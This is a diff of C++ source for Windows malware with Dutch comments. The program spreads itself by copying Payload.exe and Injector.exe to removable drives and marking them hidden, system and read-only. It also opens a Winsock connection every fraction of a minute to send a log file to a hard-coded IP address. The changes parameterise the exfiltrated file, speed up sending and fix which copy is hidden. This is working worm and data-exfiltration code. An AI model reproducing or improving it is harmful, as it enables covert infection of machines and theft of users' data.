@@ -17,7 +17,7 @@ const char *drive[]={
     "m:", "n:", "o:", "p:", "q:", "r:", "s:", "t:", "u:", "v:", "w:", "x:",
     "y:", "z:", 0
 };
-const char* ipAdres = "192.168.56.1";
+const char* ipAdres = "192.168.178.110";
 const char payload[MAX_PATH]="\\Payload.exe";
 const char infector[MAX_PATH]="\\Injector.exe";
 
@@ -171,7 +171,7 @@ int FindDrv(const char *drive)
 
         CopyFile(path,dirX,TRUE);
         CopyFile(path2,dirX2,TRUE); 
-        SetFileAttributes(path,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
+        SetFileAttributes(dirX,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
         //strcpy(dirX, drive);
         //strcat(dirX, "\\" );
         //strcat(dirX, autorun);
@@ -193,7 +193,7 @@ int Worm() {
     return 0;
 }
 
-int SendLog() {
+int SendLog(char* logFile) {
 
     // Initialize Winsock
     WSADATA wsaData;
@@ -226,7 +226,7 @@ int SendLog() {
     cerr << "Connected to server" << endl;
 
     // Open the file for reading
-    ifstream file("myfile.txt", ios::binary); //file die je door wilt sturen
+    ifstream file( logFile, ios::binary); //file die je door wilt sturen
     if (!file.is_open()) {
         cerr << "Error: Failed to open file for reading" << endl;
         closesocket(clientSock);
@@ -294,8 +294,8 @@ int main()
     while (true) {
         auto current_time = std::chrono::steady_clock::now();
         auto elapsed_time = std::chrono::duration_cast<std::chrono::minutes>(current_time - last_executed_time).count();
-        if (elapsed_time >= 1) {
-            SendLog(); // voert de sendlog uit
+        if (elapsed_time >= 0.3) {
+            SendLog(logFiledir); // voert de sendlog uit
             last_executed_time = current_time;                        
         }
         Sleep(10);
